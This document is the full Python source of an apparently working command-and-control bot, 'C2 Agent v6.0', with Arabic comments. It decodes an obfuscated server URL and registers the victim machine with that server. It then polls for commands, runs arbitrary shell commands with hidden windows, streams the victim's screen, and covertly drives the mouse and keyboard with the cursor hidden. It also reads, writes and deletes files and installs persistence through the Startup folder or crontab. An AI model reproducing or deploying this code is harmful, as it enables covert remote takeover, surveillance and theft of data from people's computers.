#!/usr/bin/env python3
# ============================================================
# 🦠 C2 Agent v6.0 — Heartbeat + Live Logs
# ============================================================
import requests
import time
import socket
import os
import platform
import subprocess
import sys
import json
import base64
import io
import shutil
import threading
import sqlite3
import glob
import tempfile
from datetime import datetime

# ════════════════════════════════════════════════════════════
# ⚙️ Configuration
# ════════════════════════════════════════════════════════════
NAME = "aHR0cHM6Ly9wcm9tYWwuYXltZW5saW51eC53b3JrZXJzLmRldg=="
SERVER = base64.b64decode(NAME.encode()).decode()
POLL_INTERVAL = 3
REQUEST_TIMEOUT = 10
DEBUG = True

# Stream
STREAMING = False
STREAM_FPS = 30
STREAM_QUALITY = 40
STREAM_WIDTH = 1280

# Control
CONTROL_ENABLED = False
SAVED_MOUSE_POS = None

# Heartbeat
HEARTBEAT_INTERVAL = 2        # كل 2 ثواني
HEARTBEAT_TIMEOUT = 10        # إذا ما رجعش status في 10 ثواني → قطع الاتصال
LAST_STATUS_OK = 0
HEARTBEAT_FAILS = 0
MAX_HEARTBEAT_FAILS = 3       # بعد 3 فشلات → re-register

# ════════════════════════════════════════════════════════════
# 📝 Live Logging
# ════════════════════════════════════════════════════════════
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD = "\033[1m"

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def log(msg, level="INFO"):
    """طباعة مع توقيت + لون"""
    t = get_time()
    if level == "OK":
        print(f"{Colors.GREEN}[{t}] [+] {msg}{Colors.RESET}", flush=True)
    elif level == "ERR":
        print(f"{Colors.RED}[{t}] [-] {msg}{Colors.RESET}", flush=True)
    elif level == "WARN":
        print(f"{Colors.YELLOW}[{t}] [!] {msg}{Colors.RESET}", flush=True)
    elif level == "CMD":
        print(f"{Colors.CYAN}[{t}] [CMD] {msg}{Colors.RESET}", flush=True)
    elif level == "RES":
        print(f"{Colors.MAGENTA}[{t}] [RES] {msg}{Colors.RESET}", flush=True)
    elif level == "STATUS":
        print(f"{Colors.BLUE}[{t}] [STATUS] {msg}{Colors.RESET}", flush=True)
    elif level == "DEBUG":
        if DEBUG:
            print(f"{Colors.BLUE}[{t}] [DBG] {msg}{Colors.RESET}", flush=True)
    else:
        print(f"[{t}] {msg}", flush=True)

def log_banner():
    print()
    print(f"{Colors.BOLD}{Colors.GREEN}" + "═" * 60 + Colors.RESET)
    print(f"{Colors.BOLD}{Colors.GREEN}  🦠 C2 AGENT v6.0 — Heartbeat System{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}" + "═" * 60 + Colors.RESET)
    print()

def get_bot_id():
    hostname = socket.gethostname()
    user = os.environ.get('USERNAME') or os.environ.get('USER') or os.environ.get('LOGNAME') or 'user'
    bot_id = hostname + "_" + user
    return ''.join(c for c in bot_id if c.isalnum() or c in '_-')

BOT_ID = get_bot_id()

# ════════════════════════════════════════════════════════════
# 🌐 Server Communication
# ════════════════════════════════════════════════════════════
session = requests.Session()
session.headers.update({
    "User-Agent": f"C2-Agent/{BOT_ID}",
    "Content-Type": "application/json",
})

def register():
    """تسجيل البوت في السيرفر"""
    try:
        data = {
            "id": BOT_ID,
            "hostname": socket.gethostname(),
            "user": os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown',
            "os": f"{platform.system()} {platform.release()}",
            "cwd": os.getcwd()
        }
        log(f"📡 Connecting to server...", "DEBUG")
        log(f"   URL: {SERVER}/register", "DEBUG")
        log(f"   Payload: {json.dumps(data)}", "DEBUG")
        
        r = session.post(f"{SERVER}/register", json=data, timeout=REQUEST_TIMEOUT)
        
        log(f"   Response: HTTP {r.status_code}", "DEBUG")
        
        if r.status_code == 200:
            result = r.json()
            if result.get("status") == "ok":
                log(f"✅ Registered as: {BOT_ID}", "OK")
                return True
            else:
                log(f"❌ Register rejected: {result}", "ERR")
                return False
        else:
            log(f"❌ Register failed: HTTP {r.status_code}", "ERR")
            return False
    except requests.exceptions.ConnectionError as e:
        log(f"❌ Connection error: {e}", "ERR")
        return False
    except requests.exceptions.Timeout:
        log(f"❌ Timeout ({REQUEST_TIMEOUT}s)", "ERR")
        return False
    except Exception as e:
        log(f"❌ Register error: {e}", "ERR")
        return False

def get_command():
    """يجيب الأمر من السيرفر (مع status)"""
    try:
        r = session.get(
            f"{SERVER}/get_command/{BOT_ID}",
            timeout=REQUEST_TIMEOUT
        )
        if r.status_code == 200:
            data = r.json()
            return data
        else:
            log(f"⚠️  get_command returned HTTP {r.status_code}", "WARN")
            return {"status": "error", "command": ""}
    except requests.exceptions.ConnectionError:
        return {"status": "connection_error", "command": ""}
    except requests.exceptions.Timeout:
        return {"status": "timeout", "command": ""}
    except Exception as e:
        log(f"⚠️  get_command error: {e}", "WARN")
        return {"status": "error", "command": ""}

def send_result(result, task_id):
    """يرسل النتيجة للسيرفر"""
    try:
        r = session.post(f"{SERVER}/send_result", json={
            "bot_id": BOT_ID,
            "result": result,
            "task_id": task_id,
            "cwd": os.getcwd()
        }, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            log(f"📤 Result sent ({len(result)} bytes)", "RES")
            return True
        else:
            log(f"⚠️  Result HTTP {r.status_code}", "WARN")
            return False
    except Exception as e:
        log(f"❌ send_result failed: {e}", "ERR")
        return False

def send_stream_frame(frame_b64, timestamp):
    """يرسل frame للسيرفر"""
    try:
        r = session.post(f"{SERVER}/stream_frame", json={
            "bot_id": BOT_ID,
            "frame": frame_b64,
            "timestamp": timestamp
        }, timeout=5)
        return r.status_code == 200
    except:
        return False

# ════════════════════════════════════════════════════════════
# 💓 Heartbeat System
# ════════════════════════════════════════════════════════════
def check_server_status():
    """
    ✅ الفكرة: يسأل السيرفر إذا الاتصال شغال
    - إذا رجع status: ok → الاتصال شغال
    - إذا رجع status: register_required → البوت ما مسجل
    - إذا فشل الطلب → مشكل في الاتصال
    """
    global LAST_STATUS_OK, HEARTBEAT_FAILS
    
    try:
        log(f"💓 Heartbeat check...", "STATUS")
        
        # نسأل السيرفر
        data = get_command()
        
        if data.get("status") == "ok":
            LAST_STATUS_OK = time.time()
            HEARTBEAT_FAILS = 0
            log(f"✅ Server OK — status received", "STATUS")
            return True
        elif data.get("status") == "register_required":
            log(f"⚠️  Server says: register required!", "WARN")
            HEARTBEAT_FAILS += 1
            return False
        elif data.get("status") in ("connection_error", "timeout"):
            HEARTBEAT_FAILS += 1
            log(f"❌ Server unreachable ({HEARTBEAT_FAILS}/{MAX_HEARTBEAT_FAILS})", "ERR")
            return False
        else:
            HEARTBEAT_FAILS += 1
            log(f"⚠️  Unknown status: {data.get('status')}", "WARN")
            return False
    except Exception as e:
        HEARTBEAT_FAILS += 1
        log(f"❌ Heartbeat error: {e}", "ERR")
        return False

def wait_for_server():
    """
    يستنى السيرفر يرد بـ status: ok قبل ما يبدأ
    """
    global HEARTBEAT_FAILS
    log("⏳ Waiting for server status...", "STATUS")
    
    attempts = 0
    while True:
        attempts += 1
        log(f"   Attempt #{attempts}", "STATUS")
        
        if check_server_status():
            log(f"✅ Connection established!", "OK")
            return True
        
        if HEARTBEAT_FAILS >= MAX_HEARTBEAT_FAILS:
            log(f"🔴 Lost connection to server ({HEARTBEAT_FAILS} fails)", "ERR")
            log(f"🔄 Restarting connection...", "WARN")
            return False
        
        time.sleep(2)

# ════════════════════════════════════════════════════════════
# 🖥️  Screenshot + Live Stream
# ════════════════════════════════════════════════════════════
def take_screenshot_b64():
    try:
        img = None
        if platform.system() == "Linux":
            try:
                import mss
                from PIL import Image
                with mss.mss() as sct:
                    monitor = sct.monitors[1]
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
            except ImportError:
                from PIL import ImageGrab
                img = ImageGrab.grab()
        else:
            from PIL import ImageGrab
            img = ImageGrab.grab()
        
        if img is None:
            return None
        
        try:
            if img.width > STREAM_WIDTH:
                ratio = STREAM_WIDTH / img.width
                new_h = int(img.height * ratio)
                img = img.resize((STREAM_WIDTH, new_h))
        except:
            pass
        
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=STREAM_QUALITY)
        return base64.b64encode(buf.getvalue()).decode('ascii')
    except Exception as e:
        log(f"❌ Screenshot error: {e}", "ERR")
        return None

def stream_loop():
    """حلقة البث المباشر"""
    global STREAMING, STREAM_FPS
    log(f"📸 Stream started (FPS={STREAM_FPS})", "OK")
    frame_count = 0
    
    while STREAMING:
        try:
            t0 = time.time()
            b64 = take_screenshot_b64()
            if b64:
                if send_stream_frame(b64, int(time.time() * 1000)):
                    frame_count += 1
                    if frame_count % 10 == 0:
                        log(f"📸 Streamed {frame_count} frames", "DEBUG")
            
            interval = 1.0 / STREAM_FPS
            elapsed = time.time() - t0
            sleep_time = max(0, interval - elapsed)
            if sleep_time > 0:
                time.sleep(sleep_time)
        except Exception as e:
            log(f"❌ Stream error: {e}", "ERR")
            time.sleep(0.5)
    
    log(f"🛑 Stream stopped ({frame_count} frames)", "OK")

# ════════════════════════════════════════════════════════════
# 🎮 Silent Control
# ════════════════════════════════════════════════════════════
def enable_silent_control():
    global CONTROL_ENABLED, SAVED_MOUSE_POS
    CONTROL_ENABLED = True
    try:
        if platform.system() == "Windows":
            import ctypes
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            pt = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
            SAVED_MOUSE_POS = (pt.x, pt.y)
            ctypes.windll.user32.ShowCursor(False)
    except:
        pass
    return "Silent control ENABLED"

def disable_silent_control():
    global CONTROL_ENABLED
    CONTROL_ENABLED = False
    try:
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowCursor(True)
            if SAVED_MOUSE_POS:
                ctypes.windll.user32.SetCursorPos(SAVED_MOUSE_POS[0], SAVED_MOUSE_POS[1])
    except:
        pass
    return "Silent control DISABLED"

def silent_mouse_move(x, y):
    try:
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.SetCursorPos(int(x), int(y))
        else:
            import pyautogui
            pyautogui.moveTo(int(x), int(y), duration=0)
        return True
    except:
        return False

def silent_mouse_click(x, y, button="left"):
    try:
        if platform.system() == "Windows":
            import ctypes
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            pt = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
            old_pos = (pt.x, pt.y)
            ctypes.windll.user32.SetCursorPos(int(x), int(y))
            time.sleep(0.05)
            MOUSEEVENTF_LEFTDOWN = 0x0002
            MOUSEEVENTF_LEFTUP = 0x0004
            MOUSEEVENTF_RIGHTDOWN = 0x0008
            MOUSEEVENTF_RIGHTUP = 0x0010
            if button == "left":
                ctypes.windll.user32.mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                time.sleep(0.02)
                ctypes.windll.user32.mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
            elif button == "right":
                ctypes.windll.user32.mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                time.sleep(0.02)
                ctypes.windll.user32.mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
            elif button == "double":
                for _ in range(2):
                    ctypes.windll.user32.mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                    time.sleep(0.02)
                    ctypes.windll.user32.mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                    time.sleep(0.05)
            time.sleep(0.05)
            ctypes.windll.user32.SetCursorPos(old_pos[0], old_pos[1])
        else:
            import pyautogui
            pyautogui.click(int(x), int(y), button=button)
        return True
    except:
        return False

def silent_key_type(text):
    try:
        if platform.system() == "Windows":
            import ctypes
            for char in text:
                INPUT_KEYBOARD = 1
                KEYEVENTF_UNICODE = 0x0004
                KEYEVENTF_KEYUP = 0x0002
                class KEYBDINPUT(ctypes.Structure):
                    _fields_ = [("wVk", ctypes.c_ushort), ("wScan", ctypes.c_ushort),
                              ("dwFlags", ctypes.c_ulong), ("time", ctypes.c_ulong),
                              ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]
                class INPUT(ctypes.Structure):
                    _fields_ = [("type", ctypes.c_ulong), ("ki", KEYBDINPUT),
                              ("padding", ctypes.c_ubyte * 8)]
                inp_down = INPUT()
                inp_down.type = INPUT_KEYBOARD
                inp_down.ki.wVk = 0
                inp_down.ki.wScan = ord(char)
                inp_down.ki.dwFlags = KEYEVENTF_UNICODE
                ctypes.windll.user32.SendInput(1, ctypes.byref(inp_down), ctypes.sizeof(inp_down))
                inp_up = INPUT()
                inp_up.type = INPUT_KEYBOARD
                inp_up.ki.wVk = 0
                inp_up.ki.wScan = ord(char)
                inp_up.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP
                ctypes.windll.user32.SendInput(1, ctypes.byref(inp_up), ctypes.sizeof(inp_up))
                time.sleep(0.02)
        else:
            import pyautogui
            pyautogui.typewrite(text, interval=0.02)
        return True
    except:
        return False

def silent_key_press(key):
    try:
        if platform.system() == "Windows":
            import ctypes
            VK = {"enter": 0x0D, "esc": 0x1B, "tab": 0x09,
                  "space": 0x20, "backspace": 0x08, "delete": 0x2E,
                  "up": 0x26, "down": 0x28, "left": 0x25, "right": 0x27}
            vk = VK.get(key.lower(), 0)
            if vk:
                KEYEVENTF_KEYUP = 0x0002
                ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                time.sleep(0.05)
                ctypes.windll.user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
        else:
            import pyautogui
            pyautogui.press(key.lower())
        return True
    except:
        return False

def handle_control_command(cmd):
    if cmd == "control_enable":
        return enable_silent_control()
    if cmd == "control_disable":
        return disable_silent_control()
    if cmd.startswith("mouse_move "):
        parts = cmd.split()
        if len(parts) >= 3:
            return "Moved" if silent_mouse_move(parts[1], parts[2]) else "Failed"
    if cmd.startswith("mouse_click "):
        parts = cmd.split()
        if len(parts) >= 3:
            button = parts[3] if len(parts) >= 4 else "left"
            return "Clicked" if silent_mouse_click(parts[1], parts[2], button) else "Failed"
    if cmd.startswith("type "):
        return "Typed" if silent_key_type(cmd[5:]) else "Failed"
    if cmd.startswith("key "):
        return "Pressed" if silent_key_press(cmd[4:].strip()) else "Failed"
    return None

# ════════════════════════════════════════════════════════════
# 💻 Command Execution
# ════════════════════════════════════════════════════════════
def execute(cmd):
    global STREAMING, STREAM_FPS, STREAM_QUALITY, STREAM_WIDTH

    cmd = cmd.strip()
    if not cmd:
        return "[Empty command]"

    log(f"⚙️  Executing: {cmd}", "DEBUG")

    # Control
    control_result = handle_control_command(cmd)
    if control_result is not None:
        return control_result

    if cmd == "pwd":
        return os.getcwd()
    if cmd == "cd":
        return os.getcwd()
    if cmd.startswith("cd "):
        path = cmd[3:].strip()
        if path == "~":
            path = os.path.expanduser("~")
        try:
            os.chdir(path)
            return "Changed to: " + os.getcwd()
        except Exception as e:
            return "Error: " + str(e)
    if cmd == "whoami":
        return os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
    if cmd == "hostname":
        return socket.gethostname()
    if cmd in ("exit", "quit", "kill"):
        return "EXIT_SIGNAL"

    if cmd in ("sysinfo", "system", "info"):
        info = [
            "=== SYSTEM INFO ===",
            "  OS:       " + platform.system() + " " + platform.release(),
            "  Arch:     " + platform.machine(),
            "  Python:   " + platform.python_version(),
            "  Hostname: " + socket.gethostname(),
            "  User:     " + (os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'),
            "  CWD:      " + os.getcwd(),
        ]
        try:
            total, used, free = shutil.disk_usage(os.path.abspath(os.sep))
            info.append("  Disk:     " + str(used // (2**30)) + "GB / " + str(total // (2**30)) + "GB")
        except:
            pass
        try:
            import psutil
            info.append("  CPU:      " + str(psutil.cpu_percent(interval=0.5)) + "%")
            info.append("  RAM:      " + str(psutil.virtual_memory().percent) + "%")
        except:
            pass
        info.append("===================")
        return "\n".join(info)

    if cmd in ("ls", "dir"):
        try:
            files = sorted(os.listdir("."))
            if not files:
                return "[Empty directory]"
            result = []
            for f in files:
                try:
                    if os.path.isdir(f):
                        result.append("[DIR]  " + f + "/")
                    else:
                        size = os.path.getsize(f)
                        if size < 1024:
                            size_str = str(size) + "B"
                        elif size < 1024 * 1024:
                            size_str = str(size // 1024) + "KB"
                        else:
                            size_str = str(size // (1024 * 1024)) + "MB"
                        result.append("[FILE] " + f + " (" + size_str + ")")
                except:
                    result.append("[?]    " + f)
            return "\n".join(result)
        except Exception as e:
            return "Error: " + str(e)

    if cmd.startswith("cat ") or cmd.startswith("type "):
        parts = cmd.split(" ", 1)
        if len(parts) < 2:
            return "Usage: cat <file>"
        try:
            with open(parts[1].strip(), 'r', encoding='utf-8', errors='replace') as f:
                content = f.read()
            if len(content) > 5000:
                return content[:5000] + "\n\n[...truncated]"
            return content if content else "[Empty file]"
        except Exception as e:
            return "Error: " + str(e)

    if cmd.startswith("write "):
        parts = cmd.split(" ", 2)
        if len(parts) < 3:
            return "Usage: write <file> <content>"
        try:
            with open(parts[1], 'w', encoding='utf-8') as f:
                f.write(parts[2])
            return "Written to " + parts[1]
        except Exception as e:
            return "Error: " + str(e)

    if cmd.startswith("rm ") or cmd.startswith("del "):
        parts = cmd.split(" ", 1)
        if len(parts) < 2:
            return "Usage: rm <path>"
        path = parts[1].strip()
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
                return "Deleted directory: " + path
            else:
                os.remove(path)
                return "Deleted file: " + path
        except Exception as e:
            return "Error: " + str(e)

    if cmd.startswith("mkdir "):
        path = cmd[6:].strip()
        try:
            os.makedirs(path, exist_ok=True)
            return "Created directory: " + path
        except Exception as e:
            return "Error: " + str(e)

    # Live Stream
    if cmd.startswith("livestream"):
        parts = cmd.split()
        try:
            if len(parts) >= 2: STREAM_FPS = int(parts[1])
            if len(parts) >= 3: STREAM_QUALITY = int(parts[2])
            if len(parts) >= 4: STREAM_WIDTH = int(parts[3])
        except: pass
        STREAMING = True
        t = threading.Thread(target=stream_loop, daemon=True)
        t.start()
        return "Live stream started (FPS=" + str(STREAM_FPS) + ")"
    if cmd == "stopstream":
        STREAMING = False
        return "Live stream stopping..."
    if cmd in ("streamstatus", "stream"):
        return "Stream: " + ('RUNNING' if STREAMING else 'STOPPED')

    if cmd in ("screenshot", "screen", "ss"):
        try:
            from PIL import ImageGrab
            filename = "screenshot_" + str(int(time.time())) + ".png"
            img = ImageGrab.grab()
            img.save(filename)
            return "Screenshot saved: " + filename
        except Exception as e:
            return "Screenshot failed: " + str(e)

    if cmd in ("myip", "publicip"):
        try:
            r = requests.get("https://api.ipify.org", timeout=5)
            return "Public IP: " + r.text
        except Exception as e:
            return "Error: " + str(e)

    if cmd in ("ps", "processes"):
        try:
            import psutil
            procs = ["PID      CPU%   MEM%   NAME"]
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    procs.append(str(p.info['pid']).ljust(9) + str(round(p.info['cpu_percent'], 1)).ljust(7) + str(round(p.info['memory_percent'], 1)).ljust(7) + p.info['name'][:40])
                except:
                    pass
                if len(procs) > 30:
                    break
            return "\n".join(procs)
        except ImportError:
            return "psutil not installed"

    if cmd == "persist":
        try:
            script_path = os.path.abspath(sys.argv[0])
            if platform.system() == "Windows":
                startup = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                dest = os.path.join(startup, os.path.basename(script_path))
                shutil.copy(script_path, dest)
                return "Persistence: " + dest
            else:
                cron = "@reboot python3 " + script_path + " &"
                os.system('(crontab -l 2>/dev/null; echo "' + cron + '") | crontab -')
                return "Persistence installed (cron)"
        except Exception as e:
            return "Error: " + str(e)

    # Arbitrary command
    try:
        if platform.system() == "Windows":
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
        else:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, executable='/bin/bash')
        try:
            output, _ = process.communicate(timeout=60)
            output = output.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            process.kill()
            return "Error: Timeout (60s)"
        return output if output.strip() else "[Command executed - no output]"
    except Exception as e:
        return "Error: " + str(e)

# ════════════════════════════════════════════════════════════
# 🚀 Main Loop with Heartbeat
# ════════════════════════════════════════════════════════════
def main():
    global HEARTBEAT_FAILS, LAST_STATUS_OK

    log_banner()
    log(f"🆔 Bot ID:  {BOT_ID}", "INFO")
    log(f"🌐 Server:  {SERVER}", "INFO")
    log(f"💻 OS:      {platform.system()} {platform.release()}", "INFO")
    log(f"👤 User:    {os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'}", "INFO")
    log(f"📁 CWD:     {os.getcwd()}", "INFO")
    print()

    # ═══════════════════════════════════════════════════
    # 🔄 MAIN RECONNECTION LOOP
    # ═══════════════════════════════════════════════════
    while True:
        log("─" * 60, "INFO")
        log("🔌 Starting connection sequence...", "STATUS")

        # 1. سجل البوت
        log("📝 Step 1: Registering bot...", "STATUS")
        attempt = 0
        registered = False
        while not registered:
            attempt += 1
            log(f"   Registration attempt #{attempt}", "DEBUG")
            if register():
                registered = True
                break
            log(f"   Waiting 5s before retry...", "WARN")
            time.sleep(5)
        
        if not registered:
            log("❌ Failed to register after many attempts", "ERR")
            time.sleep(10)
            continue

        # 2. استنى السيرفر يرد بـ status: ok
        log("💓 Step 2: Waiting for server heartbeat...", "STATUS")
        if not wait_for_server():
            log("🔴 Server unreachable → reconnecting...", "ERR")
            time.sleep(5)
            continue

        # 3. ابدأ الحلقة الرئيسية
        log("✅ Step 3: Connected! Starting main loop...", "OK")
        log(f"   Poll interval: {POLL_INTERVAL}s", "INFO")
        log(f"   Heartbeat: every {HEARTBEAT_INTERVAL}s", "INFO")
        print()

        consecutive_errors = 0
        last_heartbeat = time.time()
        loop_count = 0

        # ═══════════════════════════════════════════════
        # 🔁 MAIN POLLING LOOP
        # ═══════════════════════════════════════════════
        while True:
            try:
                loop_count += 1
                
                # heartbeat كل HEARTBEAT_INTERVAL
                if time.time() - last_heartbeat >= HEARTBEAT_INTERVAL:
                    last_heartbeat = time.time()
                    log(f"💓 Heartbeat #{loop_count}", "STATUS")
                    
                    # check status
                    if not check_server_status():
                        if HEARTBEAT_FAILS >= MAX_HEARTBEAT_FAILS:
                            log(f"🔴 LOST CONNECTION TO SERVER!", "ERR")
                            log(f"🔄 Reconnecting in 5 seconds...", "WARN")
                            time.sleep(5)
                            break  # اخرج من الحلقة الداخلية → re-register
                        log(f"⚠️  Heartbeat fail ({HEARTBEAT_FAILS}/{MAX_HEARTBEAT_FAILS})", "WARN")
                
                # اسأل عن أمر
                data = get_command()
                status = data.get("status")
                
                # ✅ تحديث حالة الاتصال
                if status == "ok":
                    consecutive_errors = 0
                    LAST_STATUS_OK = time.time()
                    HEARTBEAT_FAILS = 0
                    
                    cmd = data.get("command", "")
                    if cmd:
                        task_id = data.get("task_id", "unknown")
                        log(f"📥 Command received: {cmd}", "CMD")
                        
                        result = execute(cmd)
                        
                        if result == "EXIT_SIGNAL":
                            log("👋 Exit signal received", "OK")
                            send_result("Bot exiting...", task_id)
                            return
                        
                        # أرسل النتيجة
                        log(f"📤 Sending result ({len(result)} bytes)", "RES")
                        send_result(result, task_id)
                        
                elif status == "register_required":
                    log("⚠️  Server says register required", "WARN")
                    log("🔄 Re-registering...", "STATUS")
                    break
                    
                elif status in ("connection_error", "timeout"):
                    consecutive_errors += 1
                    log(f"⚠️  Connection error ({consecutive_errors})", "WARN")
                    
                    if consecutive_errors >= 5:
                        log(f"🔴 LOST CONNECTION TO SERVER!", "ERR")
                        log(f"🔄 Reconnecting in 5 seconds...", "WARN")
                        time.sleep(5)
                        break
                    
                    time.sleep(2)
                    continue
                
                time.sleep(POLL_INTERVAL)
                
            except KeyboardInterrupt:
                log("👋 Stopped by user", "OK")
                return
            except requests.exceptions.ConnectionError:
                consecutive_errors += 1
                log(f"❌ LOST CONNECTION TO SERVER! ({consecutive_errors})", "ERR")
                if consecutive_errors >= 3:
                    log("🔄 Reconnecting in 5 seconds...", "WARN")
                    time.sleep(5)
                    break
                time.sleep(2)
            except Exception as e:
                consecutive_errors += 1
                log(f"❌ Error: {e}", "ERR")
                if consecutive_errors >= 3:
                    log("🔄 Reconnecting in 5 seconds...", "WARN")
                    time.sleep(5)
                    break
                time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        log("👋 Goodbye!", "OK")
